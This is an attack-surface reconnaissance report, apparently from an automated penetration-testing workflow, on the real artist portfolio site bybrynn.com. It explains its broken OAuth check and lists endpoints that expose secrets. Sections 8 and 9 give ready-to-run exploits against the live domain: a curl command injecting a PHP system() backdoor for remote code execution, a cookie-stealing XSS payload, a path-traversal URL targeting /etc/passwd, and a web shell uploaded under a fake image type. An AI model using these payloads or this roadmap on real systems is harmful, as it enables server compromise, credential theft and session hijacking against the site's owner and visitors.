# Reconnaissance Deliverable: bybrynn.com Attack Surface Analysis

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the bybrynn.com application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

---

## 1. Executive Summary

**Application**: bybrynn.com is an artist portfolio and artwork submission management system.

**Core Purpose**: Public portfolio website showcasing artwork with an authenticated submission portal for the artist to add new pieces to their gallery.

**Technology Stack**:
- **Frontend**: HTML5, JavaScript (ES6+), Bootstrap CSS, Ionicons 7.1.0, Isotope 3.0.6
- **Backend**: PHP 7.x/8.x (pure PHP, no framework)
- **Authentication**: Microsoft Azure AD OAuth 2.0
- **Data Storage**: JSON flat files (no traditional database)
- **Infrastructure**: Web server (Apache/Nginx inferred), CDN resources from Google Fonts, unpkg.com, cdn.jsdelivr.net
- **Additional Services**: Tor hidden service support at artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion

**Primary User-Facing Components**:
1. Public portfolio galleries (art and photography)
2. E-commerce shop pages for prints and merchandise
3. About and commissions information pages
4. OAuth-protected artwork submission portal (admin only)

**Critical Security Posture**: The application has **ZERO authorization controls** implemented despite having OAuth authentication. Authentication bypass allows anonymous users to perform administrative operations including remote code execution.

---

## 2. Technology & Service Map

### Frontend Technologies
- **Framework**: Vanilla JavaScript with Bootstrap CSS
- **Key Libraries**:
  - Ionicons 7.1.0 (icon library from unpkg.com CDN)
  - Isotope 3.0.6 (gallery layout/filtering from cdn.jsdelivr.net)
  - Google Fonts (Libre Baskerville typography)
  - Elfsight Platform (third-party widget integration)
- **Authentication Libraries**: Microsoft OAuth 2.0 client-side flow

### Backend Technologies
- **Language**: PHP 7.x/8.x
- **Framework**: None (pure PHP)
- **Key Dependencies** (Composer):
  - `league/oauth2-client` v2.8+
  - `stevenmaguire/oauth2-microsoft` v2.2+
  - Guzzle HTTP client stack (transitive dependencies)
- **Image Processing**: PHP GD Library (libgd) for thumbnail generation
- **Session Management**: PHP native sessions with custom cookie parameters

### Infrastructure
- **Hosting Provider**: Unknown (certificate expired 134 days ago as of 2026-02-12)
- **CDN**: Google Fonts, unpkg.com, cdn.jsdelivr.net (no SRI hashes)
- **Primary Domain**: https://bybrynn.com
- **SSL/TLS**: HTTPS with expired certificate (ERR_CERT_DATE_INVALID)
- **Alternative Access**: Tor hidden service (HTTP)

### Identified Subdomains
- **Primary**: bybrynn.com
- **Onion Service**: artbybryndkmgb6ach4uqhrhsfkqbtcf3vrptfkljhclc3bxk74giwid.onion

### Open Ports & Services
*Note: External port scan data from pre-reconnaissance phase not available. Inferred services:*
- **Port 443/tcp**: HTTPS web server (expired certificate)
- **Port 80/tcp**: HTTP web server (likely redirects to HTTPS)

### Database Technology
- **Type**: JSON flat files
- **Primary Database**: `/art/entries.json` (publicly accessible)
- **No SQL Database**: MySQL, PostgreSQL, MongoDB, or SQLite not present

---

## 3. Authentication & Session Management Flow

### Entry Points
- **Primary Authentication Endpoint**: `GET /submissions` → Redirects to Microsoft OAuth
- **OAuth Provider**: Microsoft Azure AD (Tenant: cd47551c-33c7-4b7f-87a9-df19f9169121)
- **No Public Registration**: Not applicable (single-artist portfolio)
- **No Login Form**: OAuth-only authentication

### Mechanism

**Step-by-Step OAuth 2.0 Authentication Flow**:

1. **User Accesses Protected Resource**
   - User navigates to `/submissions` (GET request)
   - File: `/repos/bybrynn-core/submissions.php:27`

2. **Session Initialization**
   - Session parameters configured (Lines 3-10):
     - Lifetime: 0 (session cookie, expires on browser close)
     - Path: `/`
     - Domain: `.bybrynn.com` (shared across subdomains)
     - Secure: true (HTTPS only)
     - HttpOnly: true (no JavaScript access)
     - SameSite: Lax (CSRF protection)
   - `session_start()` called (Line 12)

3. **OAuth Provider Setup**
   - Microsoft OAuth provider instantiated (Lines 37-44)
   - Configuration:
     - Client ID: From environment variable `MICROSOFT_OAUTH_CLIENT_ID`
     - Client Secret: From environment variable `MICROSOFT_OAUTH_CLIENT_SECRET`
     - Tenant ID: `cd47551c-33c7-4b7f-87a9-df19f9169121` (hardcoded)
     - Redirect URI: `https://bybrynn.com/submissions`
     - Authorization URL: `https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/authorize`
     - Token URL: `https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token`
     - User Info URL: `https://graph.microsoft.com/oidc/userinfo`

4. **Authorization Request Generation**
   - Authorization URL created with parameters (Lines 51-57):
     - Scope: `User.Read`
     - Prompt: `select_account`
     - State: Random CSRF token
   - CSRF token stored in session: `$_SESSION['oauth2state'] = $provider->getState();` (Line 55)
   - User redirected to Microsoft login page

5. **User Authentication at Microsoft**
   - User authenticates with Microsoft credentials
   - User authorizes application access
   - Microsoft redirects back to `/submissions?code=XXXX&state=YYYY`

6. **Callback Processing**
   - Error handling for OAuth errors (Lines 46-48)
   - State parameter validated against session (Lines 60-63):
     ```php
     if (empty($_GET['state']) || ($_GET['state'] !== ($_SESSION['oauth2state'] ?? null))) {
         unset($_SESSION['oauth2state']);
         exit('Invalid OAuth state');
     }
     ```

7. **Token Exchange**
   - Authorization code exchanged for access token (Lines 65-71):
     ```php
     $token = $provider->getAccessToken('authorization_code', [
         'code' => $_GET['code'],
     ]);
     ```
   - POST request to: `https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token`

8. **Resource Owner Retrieval**
   - User details fetched using access token (Lines 73-76):
     ```php
     $owner = $provider->getResourceOwner($token);
     ```
   - GET request to: `https://graph.microsoft.com/oidc/userinfo`
   - Available user data: ID, email, first name, last name, full name, profile URL

9. **⚠️ CRITICAL FLAW: Token and User Data Discarded**
   - Both `$token` and `$owner` variables are **NEVER STORED**
   - No session variables set to persist authentication state
   - No database entry created
   - Authentication artifacts lost immediately
   - User info available but unused

10. **Form Display**
    - Submission form rendered (Lines 255-351)
    - Form accessible without any session validation

### Code Pointers
- **Session Configuration**: `/repos/bybrynn-core/submissions.php:3-10`
- **OAuth Provider Setup**: `/repos/bybrynn-core/submissions.php:28-44`
- **Authorization Flow**: `/repos/bybrynn-core/submissions.php:46-77`
- **Token Exchange**: `/repos/bybrynn-core/submissions.php:65-71`
- **User Info Retrieval**: `/repos/bybrynn-core/submissions.php:73-76`
- **OAuth Library**: `/repos/bybrynn-core/vendor/league/oauth2-client/src/Provider/AbstractProvider.php`
- **Microsoft Provider**: `/repos/bybrynn-core/vendor/stevenmaguire/oauth2-microsoft/src/Provider/Microsoft.php`

### 3.1 Role Assignment Process

**⚠️ CRITICAL FINDING: NO ROLE ASSIGNMENT IMPLEMENTED**

- **Role Determination**: Not implemented
- **Default Role**: Not applicable - no roles exist
- **Role Upgrade Path**: Not applicable
- **Code Implementation**: None

**Expected vs Actual**:
- **Expected**: Artist/Admin role assigned after successful OAuth authentication
- **Actual**: OAuth completes successfully but user identity is immediately discarded with no role assignment

**Resource Owner Data Available But Unused**:
- The `$owner` object contains user email, name, and ID (Line 74)
- Could be used to determine if user is the artist (compare email to whitelist)
- Instead, variable goes out of scope with no persistence

### 3.2 Privilege Storage & Validation

**⚠️ CRITICAL FINDING: NO PRIVILEGE STORAGE**

- **Storage Location**: None - privileges are not stored anywhere
- **Validation Points**: None - no authorization checks exist
- **Cache/Session Persistence**: OAuth state token only (cleared after use)
- **Code Pointers**: No authorization validation code exists

**Session Contents**:
- **During OAuth**: `$_SESSION['oauth2state']` contains CSRF token (Line 55)
- **After OAuth**: Session contains no user identity or privileges
- **Expected**: Should store user email, role, authentication status, OAuth token
- **Actual**: Empty session after OAuth completion

### 3.3 Role Switching & Impersonation

**Finding**: No role switching or impersonation features exist.

- **Impersonation Features**: None
- **Role Switching**: Not applicable (no roles)
- **Audit Trail**: Debug logging exists but logs all requests, not just privileged actions
- **Code Implementation**: None

---

## 4. API Endpoint Inventory

**Network Surface Focus**: This table includes only network-accessible endpoints reachable through the deployed web application.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/submissions` | ⚠️ **NONE** (should be admin) | None | OAuth initiated but not enforced | Initiates Microsoft OAuth flow. **Authentication bypass**: Form accessible without completing OAuth. See `/repos/bybrynn-core/submissions.php:27-77` |
| POST | `/submissions` | ⚠️ **NONE** (should be admin) | None | **NO CHECKS** | Processes artwork submissions. **Critical vulnerability**: POST handler bypasses entire OAuth flow (Line 27 excludes POST from auth check). Allows unauthenticated file uploads and code injection. See `/repos/bybrynn-core/submissions.php:121-253` |
| GET | `/art/index.php` | anon | None | None | Public art gallery listing with thumbnail generation. See `/repos/bybrynn-core/art/index.php:1-195` |
| GET | `/art/entries.json` | anon | None | None | Static JSON data file containing all artwork metadata. Publicly readable. See `/repos/bybrynn-core/art/entries.json` |
| GET | `/art/page.html` | anon | `?art={slug}` | None | Individual artwork detail page. Client-side JavaScript fetches from entries.json. Potential path traversal in secondary image loading. See `/repos/bybrynn-core/art/page.html` |
| GET | `/photography/index.html` | anon | None | None | Photography portfolio gallery. Static HTML. |
| GET | `/shop/index.html` | anon | None | None | E-commerce shop listing page. Static HTML. |
| GET | `/about/index.html` | anon | None | None | Artist biography and contact information. Static HTML. |
| GET | `/commissions/index.html` | anon | None | None | Commission information and FAQ. Static HTML. |
| GET | `/env.php` | ⚠️ **NONE** (should be deleted) | None | **NO CHECKS** | **CRITICAL**: Exposes Microsoft OAuth client ID and secret in plaintext. See `/repos/bybrynn-core/env.php:2-4` |
| GET | `/info.php` | ⚠️ **NONE** (should be admin/deleted) | None | **NO CHECKS** | **CRITICAL**: Exposes complete PHP configuration via phpinfo(). See `/repos/bybrynn-core/info.php:2` |
| GET | `/admin_debug.log` | ⚠️ **NONE** (should be inaccessible) | None | **NO CHECKS** | **CRITICAL**: May contain session IDs, cookies, OAuth codes, and sensitive request data. Written by `/repos/bybrynn-core/submissions.php:14-21, 85-88` |

**Total Network-Accessible Endpoints**: 11
**Endpoints Requiring Authorization**: 3 (submissions POST, env.php, info.php)
**Endpoints With Working Authorization**: 0
**Endpoints With Authentication Bypass**: 2 (submissions GET/POST)
**Endpoints With Information Disclosure**: 3 (env.php, info.php, admin_debug.log)

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus**: Only input vectors accessible through the target web application's network interface are reported below.

### URL Parameters (GET)

| Parameter | Endpoint | File:Line | Validation | Dangerous Operation | Risk Level |
|-----------|----------|-----------|------------|---------------------|------------|
| `error` | `/submissions` | submissions.php:46 | htmlspecialchars() | Output only | Low |
| `error_description` | `/submissions` | submissions.php:47 | htmlspecialchars() | Output only | Low |
| `code` | `/submissions` | submissions.php:67 | OAuth library validation | Token exchange | Medium |
| `state` | `/submissions` | submissions.php:60 | CSRF comparison | CSRF protection | Low |
| `art` | `/art/page.html` | art/page.html:35 (JS) | **NONE** | **Path construction** | **HIGH** |

### POST Body Fields (JSON/Form)

| Field Name | Endpoint | File:Line | Required | Validation | Dangerous Operation | Risk Level |
|------------|----------|-----------|----------|------------|---------------------|------------|
| `title` | `/submissions` | submissions.php:124 | Yes | Required check, trim() | **Code injection** (slug used in PHP write) | **CRITICAL** |
| `medium` | `/submissions` | submissions.php:125 | Yes | Required check, trim() | Stored in JSON (XSS) | Medium |
| `dimensions` | `/submissions` | submissions.php:126 | Yes | Required check, trim() | Stored in JSON (XSS) | Medium |
| `year` | `/submissions` | submissions.php:127 | Yes | Required check, trim() | Stored in JSON (XSS) | Medium |
| `description` | `/submissions` | submissions.php:128 | No | trim() only | Stored in JSON (XSS) | Medium |
| `date` | `/submissions` | submissions.php:129 | No | **NONE** | **Code injection** (written to PHP file) | **CRITICAL** |

### File Upload Fields

| Field Name | Endpoint | File:Line | Validation | Dangerous Operation | Risk Level |
|------------|----------|-----------|------------|---------------------|------------|
| `highres` | `/submissions` | submissions.php:142-151 | Client MIME type only | File write to /art/images/ | **HIGH** |
| `secondary` | `/submissions` | submissions.php:154-163 | Client MIME type only | File write to /art/images/ | **HIGH** |

### HTTP Headers

| Header | Endpoint | File:Line | Usage | Risk Level |
|--------|----------|-----------|-------|------------|
| `REQUEST_METHOD` | `/submissions` | submissions.php:27 | Flow control (auth bypass) | **CRITICAL** |
| `DOCUMENT_ROOT` | Various | thumb.php:12, art/index.php:155 | Path construction | Low (server-controlled) |

### Cookie Values

| Cookie | Endpoint | File:Line | Usage | Security Config | Risk Level |
|--------|----------|-----------|-------|-----------------|------------|
| `PHPSESSID` | `/submissions` | submissions.php:12 | Session management | Secure, HttpOnly, SameSite=Lax | Low (properly configured) |
| `$_COOKIE` (all) | `/submissions` | submissions.php:17 | **Logged to file** | None | **HIGH** (exposure risk) |

### Summary Statistics
- **Total Input Vectors**: 18
- **Critical Risk**: 3 (title, date, REQUEST_METHOD)
- **High Risk**: 3 (file uploads, ?art parameter, cookie logging)
- **Medium Risk**: 5 (OAuth code, stored XSS fields)
- **Low Risk**: 7 (properly validated/server-controlled)

---

## 6. Network & Interaction Map

**Network Surface Focus**: Only components accessible through the deployed application's network interface are mapped below.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Internet Users | ExternAsset | Internet | Web Browsers | None | Public visitors, anonymous artists |
| bybrynn-web-app | Service | Edge | PHP 7.x/8.x | PII (email), OAuth tokens, Session IDs | Main application server |
| art-gallery | Service | Edge | PHP/Static HTML | Public | Art portfolio pages |
| submission-portal | Service | Edge | PHP + OAuth | PII, Artwork files | Admin submission system |
| Microsoft-AAD | ThirdParty | ThirdParty | Azure AD | User identity, OAuth tokens | Authentication provider |
| MS-Graph-API | ThirdParty | ThirdParty | Microsoft Graph | User profile data | Resource server |
| JSON-FileStore | DataStore | App | JSON flat files | Artwork metadata, Public | Primary data storage |
| Image-FileStore | DataStore | App | WebP files | Artwork images, Public | File system storage |
| PHP-Sessions | DataStore | App | PHP session files | OAuth state tokens | Session management |
| Debug-Log | DataStore | App | Text log file | Session IDs, Cookies, **Sensitive** | Debug logging (security risk) |
| CDN-Resources | ThirdParty | Internet | CDN | JavaScript libraries, Public | External dependencies |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| bybrynn-web-app | Hosts: https://bybrynn.com; Endpoints: /submissions, /art/*, /shop/*, /about/, /commissions/, /photography/; Auth: Microsoft OAuth 2.0 (not enforced); Dependencies: Microsoft-AAD, MS-Graph-API, JSON-FileStore, Image-FileStore, CDN-Resources |
| submission-portal | Hosts: https://bybrynn.com/submissions; Methods: GET (OAuth init), POST (submission handler); Auth: **BYPASSED** (POST excluded from auth check); Writes: JSON-FileStore, Image-FileStore, PHP code files |
| Microsoft-AAD | Issuer: login.microsoftonline.com; Tenant: cd47551c-33c7-4b7f-87a9-df19f9169121; Endpoints: /oauth2/v2.0/authorize, /oauth2/v2.0/token; Scope: User.Read |
| MS-Graph-API | Endpoint: https://graph.microsoft.com/oidc/userinfo; Token: Bearer; Returns: User ID, Email, Name |
| JSON-FileStore | Engine: Flat JSON file; Path: /art/entries.json; Exposure: **Publicly readable**; Format: Object with slug keys; Lock: LOCK_EX on writes |
| Image-FileStore | Path: /art/images/; Format: WebP only (claimed); Thumbnails: /art/images/thumb/; Permissions: 0755 |
| Debug-Log | Path: /admin_debug.log; Contains: **Session IDs, Cookies, OAuth codes, GET/POST data**; Exposure: **May be web-accessible**; Written: Every request to /submissions |
| CDN-Resources | Sources: unpkg.com, cdn.jsdelivr.net, fonts.googleapis.com, static.elfsight.com; Protection: **No SRI hashes**; Risk: Supply chain compromise |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Internet Users → bybrynn-web-app | HTTPS | :443 /* | None | Public |
| Internet Users → art-gallery | HTTPS | :443 /art/* | None | Public |
| Internet Users → submission-portal (GET) | HTTPS | :443 /submissions | auth:oauth-initiation (incomplete) | PII |
| Internet Users → submission-portal (POST) | HTTPS | :443 /submissions | **NONE** (bypass) | PII, Files, **Code injection** |
| submission-portal → Microsoft-AAD | HTTPS | :443 /oauth2/v2.0/authorize | state-token | OAuth request |
| Microsoft-AAD → submission-portal | HTTPS | :443 /submissions?code=&state= | state-validation | Authorization code |
| submission-portal → Microsoft-AAD | HTTPS | :443 /oauth2/v2.0/token | client-credentials | OAuth token |
| submission-portal → MS-Graph-API | HTTPS | :443 /oidc/userinfo | bearer-token | PII (user email, name) |
| submission-portal → JSON-FileStore | File | /art/entries.json | **NONE** | Artwork metadata |
| submission-portal → Image-FileStore | File | /art/images/*.webp | mime-type (weak) | Artwork files |
| submission-portal → Debug-Log | File | /admin_debug.log | None | **Session IDs, Secrets** |
| art-gallery → JSON-FileStore | File | /art/entries.json | None | Public data |
| art-gallery → Image-FileStore | File | /art/images/* | None | Public images |
| bybrynn-web-app → CDN-Resources | HTTPS | :443 various | **No SRI** | JavaScript, CSS, Fonts |
| Internet Users (JS) → JSON-FileStore | HTTPS | :443 /art/entries.json | None | Public data |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:oauth-initiation | Auth | Initiates Microsoft OAuth 2.0 flow but does NOT persist authentication state. User identity discarded after OAuth completion. |
| state-validation | Auth | Validates OAuth state parameter against session-stored CSRF token to prevent authorization code interception. Implemented correctly at submissions.php:60-63. |
| bearer-token | Auth | OAuth 2.0 Bearer token sent to Microsoft Graph API. Token obtained but never stored or reused. |
| client-credentials | Auth | OAuth client ID and secret sent to token endpoint. Credentials stored in environment variables but exposed via /env.php. |
| mime-type (weak) | Input Validation | Validates file upload MIME type as 'image/webp' but relies on client-provided value. No server-side content verification. submissions.php:143, 155. |
| **auth:none** | Authorization | **NO AUTHORIZATION CHECKS IMPLEMENTED**. POST handler completely bypasses OAuth authentication check (submissions.php:27). Anonymous users can perform administrative operations. |
| **bypass:post-method** | Authorization Bypass | POST requests to /submissions skip all authentication logic because auth check is `if ($_SERVER['REQUEST_METHOD'] !== 'POST')`. Allows unauthenticated submissions. submissions.php:27. |

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**⚠️ CRITICAL FINDING: NO ROLE SYSTEM EXISTS**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 | Global | Default - no authentication required |
| **artist (intended but not implemented)** | **10** | **Global** | **MISSING** - OAuth completes but no role assigned |

**Analysis**: The application has OAuth authentication configured but no authorization system. The intended model appears to be:
- **Anonymous users**: Read-only access to portfolio
- **Artist (authenticated)**: Full access to submission portal

However, the POST handler bypasses all authentication, resulting in:
- **Anonymous users**: Full administrative access including code injection

### 7.2 Privilege Lattice

```
INTENDED PRIVILEGE ORDERING:
anon → artist (authenticated via Microsoft OAuth)

ACTUAL PRIVILEGE ORDERING:
anon = artist (authentication not enforced)
```

**No Hierarchy**: Only two conceptual states exist (anonymous vs authenticated), but authentication is not enforced for privileged operations.

**No Parallel Isolation**: Single-artist application, no multi-tenancy or team roles.

**No Role Switching**: No impersonation or privilege elevation mechanisms.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/` (home page) | `/*` (all public pages), `/submissions` (bypassed) | None |
| artist (intended) | `/submissions` | Should be `/submissions` only | Microsoft OAuth 2.0 (not enforced) |

**OAuth Flow**:
1. GET `/submissions` → Redirect to Microsoft login
2. User authenticates at Microsoft
3. Callback to `/submissions?code=&state=`
4. Token exchange and user info retrieval
5. **Artifacts discarded** - no session persistence
6. Form displayed but accessible to anyone

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | N/A |
| artist (intended) | OAuth flow (submissions.php:27-77) | **NONE** (bypassed for POST) | **NONE** (token discarded) |

**Critical Code Analysis**:

```php
// submissions.php:27 - Authentication bypass
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    // OAuth authentication logic here (lines 28-77)
    // Completes successfully but stores nothing
}

// submissions.php:121 - Privileged operation with NO auth check
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Process submission WITHOUT any authentication validation
    // Allows anonymous code injection
}
```

**What's Missing**:
```php
// Expected after OAuth (NOT IMPLEMENTED):
$_SESSION['authenticated'] = true;
$_SESSION['user_email'] = $owner->getEmail();
$_SESSION['user_role'] = 'artist';

// Expected in POST handler (NOT IMPLEMENTED):
if (!isset($_SESSION['authenticated']) || $_SESSION['user_role'] !== 'artist') {
    exit('Unauthorized');
}
```

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**Finding**: No user-specific resource ownership exists. All resources are global (single-artist portfolio).

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| N/A | No horizontal escalation vectors | N/A | N/A | Single-artist application |

**Note**: The application has no multi-user functionality. All artworks belong to the same artist. Horizontal privilege escalation is not applicable.

**Potential Future Risk**: If the application were extended to support multiple artists, the following would be vulnerable:
- `POST /submissions` - No validation that submitting user owns the artwork being modified
- `/art/entries.json` - No per-user data segregation
- `/art/images/` - Filename collisions would allow one artist to overwrite another's work

### 8.2 Vertical Privilege Escalation Candidates

**⚠️ CRITICAL: Complete vertical privilege escalation from anonymous to admin without any authentication.**

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| artist (admin) | `POST /submissions` | Artwork submission with file upload | **CRITICAL** |
| artist (admin) | `POST /submissions` | **Remote code execution** via date parameter | **MAXIMUM** |
| artist (admin) | `POST /submissions` | Database (JSON) manipulation | **CRITICAL** |
| artist (admin) | `POST /submissions` | PHP code injection into index.php | **MAXIMUM** |
| artist (admin) | `GET /env.php` | OAuth credential exposure | **CRITICAL** |
| artist (admin) | `GET /info.php` | Server configuration disclosure | **HIGH** |
| artist (admin) | `GET /admin_debug.log` | Session hijacking via log access | **CRITICAL** |

**Attack Path**:
```
Anonymous User (Level 0)
    ↓
    Direct POST to /submissions (no authentication check)
    ↓
    Upload malicious files
    ↓
    Inject PHP code via date parameter
    ↓
Remote Code Execution (Server Compromise)
```

**Proof of Concept**:
```bash
# Anonymous user gains RCE without any authentication
curl -X POST https://bybrynn.com/submissions \
  -F "title=pwned" \
  -F "medium=test" \
  -F "dimensions=1x1" \
  -F "year=2024" \
  -F "date=2024'];system(\$_GET['cmd']);//" \
  -F "highres=@fake.webp"

# Execute commands:
curl "https://bybrynn.com/art/?cmd=id"
```

### 8.3 Context-Based Authorization Candidates

**Finding**: No multi-step workflow authorization.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|----------------------|------------------|
| OAuth Callback | `/submissions?code=&state=` | State token in session | LOW (validated) |
| Form Submission | `POST /submissions` | OAuth completed | **CRITICAL (no check)** |

**OAuth State Bypass Analysis**:
- State parameter IS validated (submissions.php:60-63)
- Prevents CSRF on OAuth callback
- However, POST submission doesn't require OAuth completion at all
- **Context bypass**: Skip OAuth entirely, POST directly

---

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus**: Only injection sources reachable through the target web application's network interface are reported.

### **INJECTION SOURCE #1: PHP Code Injection via Date Parameter**

**Type**: Code Injection → Remote Code Execution
**Severity**: **MAXIMUM (10.0 CVSS)**
**Network Accessible**: YES

**Complete Data Flow**:
1. **Input Point**: `POST /submissions` → `$_POST['date']` (submissions.php:129)
2. **Validation**: **NONE** - No format check, no sanitization
3. **Processing**: `$date = $_POST['date'] ?? date('Y-m-d');`
4. **Dangerous Concatenation**: `$block = "['slug' => '$slug', 'date' => '$date'],\n";` (Line 236)
5. **File Write**: `file_put_contents($indexFile, ...)` writes to `/art/index.php` (Line 242)
6. **Execution Sink**: `/art/index.php` is a PHP file executed on subsequent requests

**Exact Code Locations**:
- Input: `/repos/bybrynn-core/submissions.php:129`
- Injection: `/repos/bybrynn-core/submissions.php:236`
- Sink: `/repos/bybrynn-core/submissions.php:242` → writes to `/repos/bybrynn-core/art/index.php`

**Exploitation**:
```
POST /submissions
date=2024'];phpinfo();system($_GET['c']);//
```

Results in index.php containing:
```php
['slug' => 'slug', 'date' => '2024'];phpinfo();system($_GET['c']);//'],
```

**Impact**: Complete server compromise, data exfiltration, malware installation, website defacement.

---

### **INJECTION SOURCE #2: Stored XSS via Artwork Metadata**

**Type**: Cross-Site Scripting (Stored) → Client-Side Code Execution
**Severity**: **HIGH (8.2 CVSS)**
**Network Accessible**: YES

**Complete Data Flow**:
1. **Input Points**:
   - `$_POST['medium']` (submissions.php:125)
   - `$_POST['dimensions']` (submissions.php:126)
   - `$_POST['year']` (submissions.php:127)
2. **Validation**: **NONE** - Only `trim()` applied, no HTML sanitization
3. **Storage**: Concatenated into JSON subheading (Line 178): `"$medium - $dimensions - $year"`
4. **Persistence**: Written to `/art/entries.json` (Lines 203, 220)
5. **Retrieval**: JavaScript fetch in `/jsrepo/art-renders.js:7`
6. **Rendering Sink**: `.innerHTML = `<a>${entry.subheading}</a>`` (art-renders.js:23)

**Exact Code Locations**:
- Input: `/repos/bybrynn-core/submissions.php:125-127`
- Storage: `/repos/bybrynn-core/submissions.php:178`
- Sink Write: `/repos/bybrynn-core/submissions.php:203, 220`
- Sink Execute: `/repos/bybrynn-core/jsrepo/art-renders.js:23`

**Exploitation**:
```
POST /submissions
medium=<img src=x onerror=alert(document.cookie)>
dimensions=10x10
year=2024
```

**Impact**: Cookie theft, session hijacking, keylogging, credential harvesting, OAuth token theft.

---

### **INJECTION SOURCE #3: Path Traversal in Client-Side Image Loading**

**Type**: Path Traversal / Local File Inclusion (Client-Side)
**Severity**: **MEDIUM (6.5 CVSS)**
**Network Accessible**: YES

**Complete Data Flow**:
1. **Input Point**: `?art=` parameter in URL (art/page.html)
2. **Validation**: **NONE** in client-side code
3. **Processing**: `const slug = params.get('art');` (Line 35)
4. **Path Construction**: `secondaryImg.src = `/art/images/${slug}-secondary.webp`;` (Line 38)
5. **File Access**: Browser attempts to load constructed path

**Exact Code Locations**:
- Input: Browser URL `?art=` parameter
- Processing: `/repos/bybrynn-core/art/page.html:35` (embedded JavaScript)
- Sink: `/repos/bybrynn-core/art/page.html:38`

**Exploitation**:
```
https://bybrynn.com/art/page.html?art=../../../../etc/passwd
```

**Mitigation**: Server-side slug sanitization (submissions.php:136) prevents malicious slugs from being created, but client-side should still validate.

---

### **INJECTION SOURCE #4: File Upload MIME Type Bypass**

**Type**: Malicious File Upload
**Severity**: **HIGH (7.5 CVSS)**
**Network Accessible**: YES

**Complete Data Flow**:
1. **Input Points**:
   - `$_FILES['highres']` (submissions.php:142-151)
   - `$_FILES['secondary']` (submissions.php:154-163)
2. **Validation**: Client-provided MIME type check only (Line 143, 155)
3. **Processing**: `if ($_FILES['highres']['type'] === 'image/webp')`
4. **File Write**: `move_uploaded_file()` to `/art/images/{slug}.webp` (Line 146, 158)

**Exact Code Locations**:
- Input: `/repos/bybrynn-core/submissions.php:142, 154`
- Validation: `/repos/bybrynn-core/submissions.php:143, 155`
- Sink: `/repos/bybrynn-core/submissions.php:146, 158`

**Exploitation**:
```bash
# Create malicious PHP file disguised as WebP
echo "<?php system(\$_GET['cmd']); ?>" > shell.webp

# Upload with fake MIME type
curl -X POST https://bybrynn.com/submissions \
  -F "title=test" \
  -F "medium=x" \
  -F "dimensions=x" \
  -F "year=2024" \
  -F "highres=@shell.webp;type=image/webp"

# Access shell (if .webp not blocked)
curl "https://bybrynn.com/art/images/test.webp?cmd=id"
```

**Note**: Requires web server to execute .webp files as PHP (unlikely but possible misconfig).

---

### **VULNERABILITIES NOT FOUND**:

- **SQL Injection**: **NOT PRESENT** - No database queries exist (JSON file storage)
- **Command Injection (Direct)**: **NOT PRESENT** - No `exec()`, `shell_exec()`, `system()`, `passthru()` calls in application code
- **Server-Side Template Injection**: **NOT PRESENT** - No template engine used
- **XML External Entity (XXE)**: **NOT PRESENT** - No XML parsing
- **Insecure Deserialization**: **NOT PRESENT** - No `unserialize()` calls
- **LDAP Injection**: **NOT PRESENT** - No LDAP integration
- **NoSQL Injection**: **NOT PRESENT** - No NoSQL database

---

### **Summary Table**:

| # | Type | Input Location | Dangerous Sink | Severity |
|---|------|----------------|----------------|----------|
| 1 | Code Injection (RCE) | submissions.php:129 (`$_POST['date']`) | submissions.php:242 → `/art/index.php` | **MAXIMUM** |
| 2 | Stored XSS | submissions.php:125-127 (`$_POST['medium/dimensions/year']`) | art-renders.js:23 (`.innerHTML`) | **HIGH** |
| 3 | Path Traversal (Client) | URL `?art=` parameter | art/page.html:38 (image src) | **MEDIUM** |
| 4 | File Upload Bypass | submissions.php:142, 154 (`$_FILES`) | move_uploaded_file() to /art/images/ | **HIGH** |
| 5 | Information Disclosure | Direct access `/env.php` | OAuth credentials echo | **CRITICAL** |
| 6 | Information Disclosure | Direct access `/info.php` | phpinfo() | **HIGH** |
